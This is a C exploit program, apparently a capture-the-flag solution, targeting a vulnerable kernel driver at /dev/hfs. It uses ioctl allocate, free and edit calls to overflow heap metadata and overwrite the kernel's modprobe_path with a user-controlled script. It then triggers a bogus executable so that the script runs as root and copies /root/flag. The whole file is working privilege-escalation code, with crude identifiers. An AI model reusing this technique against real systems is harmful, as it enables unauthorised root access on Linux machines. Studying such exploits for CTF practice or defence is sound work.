#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>

#define ALLOC_CMD 0xABCD0001
#define FREE_CMD 0xABCD0002
#define EDIT_CMD 0xABCD0004

void freeshit(long id);
void alloc(long, long);
void edit(long id, long size, long data_ptr);

int fd;

int main() {
  fd = open("/dev/hfs", O_RDONLY);
  if (fd == -1) {
    puts("Failed to open fd");
  }
  printf("Fd: %d\n", fd);

  long test[4];
  for (int i = 0; i < 7; i++) {
    alloc(0x69+i, 0x20);
  }

  freeshit(0x6b);

  char* sice = (char*)malloc(0x21);
  for (int i = 0; i < 0x21; i++) {
    sice[i] = '\x80';
  }
  sice[0x20] = '\xd0';

  edit(0x6a, 0x21, (long)sice);
  alloc(0x10, 0x20);
  alloc(0x11, 0x20);

  char* sice2 = (char*)malloc(0x20);
  sice2[0x10] = '\x05';
  long modprobe = 0xffffffff81a3f7a0;
  *(long*)&sice2[0x18] = modprobe;
  
  edit(0x10, 0x20, (long)sice2);

  char* sice3 = (char*)malloc(0x20);
  strcpy(sice3, "/home/user/dick.sh");
  edit(0x5, 0x20, (long)sice3);

  system("echo -ne '#!/bin/sh\n/bin/cp /root/flag /home/user/flag\n/bin/chmod 777 /home/user/flag' > /home/user/dick.sh");
  system("chmod +x /home/user/dick.sh");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/ll");
  system("chmod +x /home/user/ll");
  system("/home/user/ll");
  system("cat /home/user/flag");

  close(fd);
}

void alloc(long id, long size) {
  long test[2];
  test[0] = id;
  test[1] = size;
  int ret = ioctl(fd, ALLOC_CMD, test);
  if (ret < 0) {
    printf("Alloc %ld with size %ld failed\n", id, size);
    perror("ioctl");
  } else {
    printf("Alloc %ld with size %ld succeeded\n", id, size);
  }
}

void edit(long id, long size, long data_ptr) {
  long test[3];
  test[0] = id;
  test[1] = size;
  test[2] = data_ptr;

  int ret = ioctl(fd, EDIT_CMD, test);
  if (ret < 0) {
    printf("Edit failed\n");
    perror("ioctl");
  } else {
    printf("Edit succeeded\n");
  }
}

void freeshit(long id) {
  long test = id;
  int ret = ioctl(fd, FREE_CMD, &test);
  if (ret < 0) {
    printf("Free failed\n");
    perror("ioctl");
  } else {
    printf("Free succeeded\n");
  }
}
